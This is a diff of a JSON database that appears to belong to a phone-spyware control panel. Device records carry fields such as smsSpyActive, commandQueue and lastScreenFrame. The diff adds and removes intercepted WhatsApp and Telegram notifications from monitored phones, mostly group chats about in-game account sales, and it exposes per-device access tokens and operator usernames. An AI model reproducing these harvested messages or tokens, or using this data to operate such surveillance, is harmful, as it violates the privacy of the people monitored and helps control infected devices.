@@ -6331,6 +6331,30 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎JB || MANZZ KALBAR (975 pesan): ~ ada",
+        "content": "📷 280 NEPIS\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
+        "time": "21/04 21:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781729665
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2952 pesan dari 19 chat",
+        "time": "21/04 21:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781729640
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2951 pesan dari 19 chat",
+        "time": "21/04 21:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781729084
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎All Buyer Pegasus-X ( No Update ) (9 pesan): ~ .",
         "content": "💟 Stiker",
         "time": "21/04 21:28",
@@ -10304,30 +10328,6 @@
         "time": "21/04 21:01",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780083902
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3592 pesan dari 21 chat",
-        "time": "21/04 21:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780078115
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (693 pesan): ~ Xell",
-        "content": "📷 OP 305k\nFIST 1\nSG 2\nLOG REDBIN TRA YG REDBIN AD BUKTI",
-        "time": "21/04 21:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780078078
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3592 pesan dari 21 chat",
-        "time": "21/04 21:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780077789
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781727760,
+    "lastSeen": 1776781728968,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16985 pesan baru dari 118 obrolan",
+        "time": "21/04 21:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781730031
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781729786
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781729686
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16984 pesan baru dari 118 obrolan",
+        "time": "21/04 21:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781729550
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14370,38 +14402,6 @@
         "time": "21/04 21:07",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776780443201
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:07",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780443161
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:07",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780443138
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5970 pesan baru dari 49 obrolan",
-        "time": "21/04 21:07",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780443106
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:07",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780441955
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781726587,
+    "lastSeen": 1776781729639,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
